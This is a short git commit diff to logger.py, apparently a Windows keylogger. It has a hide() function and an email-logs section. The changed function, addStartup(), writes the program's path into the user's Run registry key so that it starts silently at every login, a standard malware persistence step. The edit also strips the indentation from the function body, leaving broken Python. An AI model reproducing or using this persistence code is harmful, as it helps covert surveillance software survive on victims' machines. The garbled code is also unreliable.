029a3f44afd373560273987a3f5c7b7ae78ddcda
NullArray <opsec@null.net>
2015-10-15 00:20:26 +0200

    Update logger.py

--- logger.py
+++ logger.py
@@ -25,18 +25,18 @@ def hide():
  
 # Add to startup
 def addStartup():
-	if getattr(sys, 'frozen', False):
-		fp = os.path.dirname(os.path.realpath(sys.executable))
-	elif __file__:
-		fp = os.path.dirname(os.path.realpath(__file__))
-    file_name=sys.argv[0].split("\\")[-1]
-    new_file_path=fp+"\\"+file_name
-    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
+if getattr(sys, 'frozen', False):
+fp = os.path.dirname(os.path.realpath(sys.executable))
+elif __file__:
+fp = os.path.dirname(os.path.realpath(__file__))
+file_name=sys.argv[0].split("\\")[-1]
+new_file_path=fp+"\\"+file_name
+keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
 
-    key2change= OpenKey(HKEY_CURRENT_USER,
-    keyVal,0,KEY_ALL_ACCESS)
+key2change= OpenKey(HKEY_CURRENT_USER,
+keyVal,0,KEY_ALL_ACCESS)
 
-    SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)
+SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)
 
 
 # Email Logs
